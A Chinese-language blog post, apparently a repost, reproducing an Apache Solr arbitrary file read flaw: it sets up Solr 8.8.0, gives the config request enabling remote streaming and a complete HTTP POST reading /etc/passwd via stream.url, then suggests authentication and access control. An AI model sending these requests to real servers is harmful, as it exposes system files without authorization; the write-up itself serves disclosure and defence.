---
title: 推荐系列-Apache Solr最新任意文件读取漏洞
categories: 热门文章
tags:
  - Popular
author: OSChina
top: 704
cover_picture: 'https://image.3001.net/images/20210401/1617262678_60657856dedf69f91e857.png!small'
abbrlink: 6fd7717a
date: 2021-04-15 10:16:56
---

&emsp;&emsp;漏洞简介 Apache Solr是一个开源搜索服务引擎，默认安装未授权情况下攻击者可以构造恶意HTTP请求读取目标Apache Solr服务器的任意文件。 本文涉及相关实验：CVE-2019-0192 Apache Solr远程反...
<!-- more -->

                                                                                                                                                                                        漏洞简介 
Apache Solr是一个开源搜索服务引擎，默认安装未授权情况下攻击者可以构造恶意HTTP请求读取目标Apache Solr服务器的任意文件。 
本文涉及相关实验：CVE-2019-0192 Apache Solr远程反序列化代码执行漏洞（Apache Solr是一个开源的搜索服务器。具有高度可靠、可伸缩和容错的，提供分布式索引���复��和负载平衡查询、自动故障转移和恢复、集中配置等功能。） 
影响版本 
solr任意版本 
环境搭建 
漏���环境下载： 
https://archive.apache.org/dist/lucene/solr/8.8.0/solr-8.8.0.tgz 
解压后进入bin目录，启动（需要java环境）， 
./solr start 
此时启动的solr是没有核心进行索引和搜索的，创建一个节点（核心） 
./solr create -c test 
访问：http://ip:8983可以看到创建的核心 
![Test](https://image.3001.net/images/20210401/1617262678_60657856dedf69f91e857.png!small  'Apache Solr最新任意文件读取漏洞') 
实际场景下可以看到会有很多核心 
![Test](https://image.3001.net/images/20210401/1617262678_60657856dedf69f91e857.png!small  'Apache Solr最新任意文件读取漏洞') 
漏洞复现 
启用远程流传输 
访问http://ip:8983/solr/test/config/抓包，将请求包修改为POST请求，修改Content-Type为“application/json”，发送以下数据： 
{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}} 
![Test](https://image.3001.net/images/20210401/1617262678_60657856dedf69f91e857.png!small  'Apache Solr最新任意文件读取漏洞') 
即可开启远程流。 
读取文件 
引入远程流，将stream.url的参数的内容作为流传递。正常情况下stream.url传入的内容为“stream.url=http:/www.remotesite.com/path/to/file.pdf”,构造传入的敏感文件 
POST /solr/test/debug/dump?param=ContentStreams HTTP/1.1 
Host: 192.168.74.139:8983 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6 
Connection: close 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 29 
stream.url=file:///etc/passwd 
![Test](https://image.3001.net/images/20210401/1617262678_60657856dedf69f91e857.png!small  'Apache Solr最新任意文件读取漏洞') 
漏洞修复 
（官方不承认这是漏洞.jpg） 
因为solr默认安装情况下未授权，导致可以读取任意文件，启用Apache Solr身份验证可有效缓解该漏洞的影响 
配置访问控制策略，避免Apache Solr暴露在互联网 
参考 
https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ
                                        